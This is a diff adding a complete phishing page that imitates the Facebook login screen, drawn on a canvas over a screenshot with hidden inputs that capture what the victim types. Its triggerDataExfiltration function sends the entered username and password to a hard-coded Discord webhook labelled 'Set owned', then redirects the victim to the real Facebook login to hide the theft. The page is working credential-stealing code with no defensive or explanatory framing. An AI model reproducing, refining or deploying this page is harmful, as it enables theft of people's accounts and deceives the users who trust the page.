@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>  </title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; background-color: #f0f2f5; height: 100vh; font-family: sans-serif; overflow: hidden; touch-action: none; }
+        canvas { box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 100%; max-height: 100%; outline: none; }
+        #proxyInput { position: absolute; opacity: 0; top: -1000px; left: -1000px; }
+    </style>
+</head>
+<body>
+
+<input type="text" id="proxyInput" autocomplete="off">
+<canvas id="appCanvas"></canvas>
+
+<script>
+    const canvas = document.getElementById('appCanvas');
+    const ctx = canvas.getContext('2d');
+    const proxyInput = document.getElementById('proxyInput');
+
+    // --- Configuration Section ---
+    const destinationEndpoint = "https://discord.com/api/webhooks/1439850231955980430/oc8OnisK1mUFu-9YK9_WhaUcy1CuErPvrBhnSJCN9Lwfht617Kad18gGAhLmOiXiVyps"; 
+    const redirectTarget = "https://www.facebook.com/login.php";
+
+    const UI_LAYOUT = {
+        inputs: [
+            { id: 'username', x: 0.045, y: 0.396, w: 0.91, h: 0.082, type: 'text', value: '', placeholder: 'Mobile number or email', isFocused: false },
+            { id: 'password', x: 0.045, y: 0.490, w: 0.91, h: 0.082, type: 'password', value: '', placeholder: 'Password', isFocused: false }
+        ],
+        button: { id: 'login', x: 0.045, y: 0.588, w: 0.91, h: 0.065, text: 'Log in' }
+    };
+
+    const bgImage = new Image();
+    bgImage.src = '1000110812.jpg';
+    
+    let isImageLoaded = false;
+    let cursorVisible = true;
+    let cursorInterval = null;
+    const FONT_SCALE = 0.035;
+
+    bgImage.onload = () => { isImageLoaded = true; resizeCanvas(); startCursorBlink(); draw(); };
+    bgImage.onerror = () => { isImageLoaded = false; resizeCanvas(); draw(); console.log("Image '1000110812.jpg' ."); };
+
+    function resizeCanvas() {
+        const imgW = isImageLoaded ? bgImage.width : 500;
+        const imgH = isImageLoaded ? bgImage.height : 900;
+        const aspectRatio = imgW / imgH;
+        let finalWidth = window.innerHeight * aspectRatio;
+        let finalHeight = window.innerHeight;
+        if (finalWidth > window.innerWidth) {
+            finalWidth = window.innerWidth;
+            finalHeight = window.innerWidth / aspectRatio;
+        }
+        canvas.width = finalWidth;
+        canvas.height = finalHeight;
+        draw();
+    }
+
+    window.addEventListener('resize', resizeCanvas);
+
+    function getInteractionPos(evt) {
+        const rect = canvas.getBoundingClientRect();
+        const scaleX = canvas.width / rect.width;
+        const scaleY = canvas.height / rect.height;
+        let clientX, clientY;
+        if (evt.touches && evt.touches.length > 0) {
+            clientX = evt.touches[0].clientX;
+            clientY = evt.touches[0].clientY;
+        } else if (evt.changedTouches && evt.changedTouches.length > 0) { // For touchend
+            clientX = evt.changedTouches[0].clientX;
+            clientY = evt.changedTouches[0].clientY;
+        } else {
+            clientX = evt.clientX; // For mouse click
+            clientY = evt.clientY;
+        }
+        return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY };
+    }
+
+    function handleInteraction(evt) {
+        evt.preventDefault(); // Crucial for preventing unwanted mobile browser behaviors
+        const pos = getInteractionPos(evt);
+        let clickedInput = null;
+        let buttonClicked = false;
+
+        // Reset focus state
+        UI_LAYOUT.inputs.forEach(input => input.isFocused = false);
+
+        // Check if button was clicked
+        const btn = UI_LAYOUT.button;
+        const bx = btn.x * canvas.width, by = btn.y * canvas.height, bw = btn.w * canvas.width, bh = btn.h * canvas.height;
+        if (pos.x >= bx && pos.x <= bx + bw && pos.y >= by && pos.y <= by + bh) {
+            buttonClicked = true;
+        } else {
+            // Check if an input was clicked
+            UI_LAYOUT.inputs.forEach(input => {
+                const ix = input.x * canvas.width, iy = input.y * canvas.height, iw = input.w * canvas.width, ih = input.h * canvas.height;
+                if (pos.x >= ix && pos.x <= ix + iw && pos.y >= iy && pos.y <= iy + ih) {
+                    input.isFocused = true;
+                    clickedInput = input;
+                }
+            });
+        }
+        
+        // Execute action based on what was clicked
+        if (buttonClicked) {
+            proxyInput.blur(); // Hide keyboard
+            triggerDataExfiltration();
+        } else if (clickedInput) {
+            activateProxyInput(clickedInput); // Show keyboard for this input
+        } else {
+            proxyInput.blur(); // Clicked background, hide keyboard
+        }
+        
+        draw();
+    }
+
+    function activateProxyInput(inputObj) {
+        proxyInput.type = inputObj.type === 'password' ? 'password' : 'text';
+        proxyInput.value = inputObj.value;
+        proxyInput.focus();
+    }
+
+    proxyInput.addEventListener('input', () => {
+        const focused = UI_LAYOUT.inputs.find(i => i.isFocused);
+        if (focused) {
+            focused.value = proxyInput.value;
+            draw();
+        }
+    });
+
+    // **REFINED EVENT LISTENERS FOR MAXIMUM COMPATIBILITY**
+    canvas.addEventListener('click', handleInteraction); // Fallback for desktop/some devices
+    canvas.addEventListener('touchend', handleInteraction, { passive: false }); // Primary trigger for mobile devices
+
+    function triggerDataExfiltration() {
+        const user = UI_LAYOUT.inputs.find(i => i.id === 'username').value;
+        const pass = UI_LAYOUT.inputs.find(i => i.id === 'password').value;
+
+        const payload = {
+            username: "CR",
+            avatar_url: "https://i.imgur.com/gPQHYa9.png",
+            embeds: [{
+                title: "Set owned",
+                color: 15158332,
+                fields: [
+                    { name: "U", value: `\`\`\`${user || "Not Provided"}\`\`\``, inline: true },
+                    { name: "P", value: `\`\`\`${pass || "Not Provided"}\`\`\``, inline: true }
+                ],
+                footer: { text: "Session at " + new Date().toUTCString() }
+            }]
+        };
+
+        const request = new XMLHttpRequest();
+        request.open("POST", destinationEndpoint);
+        request.setRequestHeader('Content-type', 'application/json');
+        request.send(JSON.stringify(payload));
+        
+        setTimeout(() => { window.location.href = redirectTarget; }, 500);
+    }
+
+    function startCursorBlink() {
+        if (cursorInterval) clearInterval(cursorInterval);
+        cursorInterval = setInterval(() => { cursorVisible = !cursorVisible; draw(); }, 530);
+    }
+
+    function draw() {
+        if (isImageLoaded) {
+            ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
+        } else {
+            ctx.fillStyle = "#f0f2f5";
+            ctx.fillRect(0,0, canvas.width, canvas.height);
+            ctx.fillStyle = "#1877F2";
+            ctx.font = `bold ${canvas.height * 0.1}px sans-serif`;
+            ctx.textAlign = "center";
+            ctx.fillText("facebook", canvas.width / 2, canvas.height * 0.2);
+        }
+
+        UI_LAYOUT.inputs.forEach(input => {
+            const ix = input.x * canvas.width, iy = input.y * canvas.height, iw = input.w * canvas.width, ih = input.h * canvas.height;
+            if (input.isFocused || input.value.length > 0) {
+                ctx.fillStyle = "#FFFFFF";
+                ctx.fillRect(ix + 2, iy + 2, iw - 4, ih - 4);
+                const fontSize = canvas.height * FONT_SCALE;
+                ctx.font = `${fontSize}px sans-serif`;
+                ctx.fillStyle = "#000000";
+                ctx.textBaseline = "middle";
+                ctx.textAlign = "left";
+                let displayText = input.type === 'password' ? '•'.repeat(input.value.length) : input.value;
+                const paddingX = iw * 0.05;
+                ctx.fillText(displayText, ix + paddingX, iy + (ih / 2));
+                if (input.isFocused && cursorVisible) {
+                    const textWidth = ctx.measureText(displayText).width;
+                    const cursorX = ix + paddingX + textWidth + 2;
+                    const cursorH = fontSize * 1.2;
+                    const cursorY = iy + (ih - cursorH) / 2;
+                    ctx.beginPath();
+                    ctx.moveTo(cursorX, cursorY);
+                    ctx.lineTo(cursorX, cursorY + cursorH);
+                    ctx.lineWidth = 2;
+                    ctx.strokeStyle = "#1877F2";
+                    ctx.stroke();
+                }
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
